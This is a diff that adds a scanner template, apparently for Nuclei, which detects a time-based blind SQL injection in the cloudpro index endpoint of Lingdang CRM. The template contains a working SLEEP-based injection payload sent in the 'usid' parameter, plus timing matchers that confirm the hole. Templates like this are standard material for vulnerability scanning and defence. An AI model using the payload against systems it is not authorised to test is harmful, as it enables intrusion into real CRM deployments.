@@ -1,0 +1,33 @@
+id: poc-yaml-51mis-crm-cloudproindex-sqli
+info:
+  name: Lingdang CRM Cloudproindex SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in the Lingdang CRM's WeiXinApp cloudproindex endpoint.
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1) + to_number(t1)}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /crm/WeiXinApp/cloudpro/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=getMyAccount&usid=1 AND (SELECT 5120 FROM (SELECT(SLEEP({{t1}})))nmLt)
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'search_reminds')"
+          - "contains(body, 'success')"
+          - "!contains(body, '<')"
+          - "duration > t2"
+          - "duration < t3"
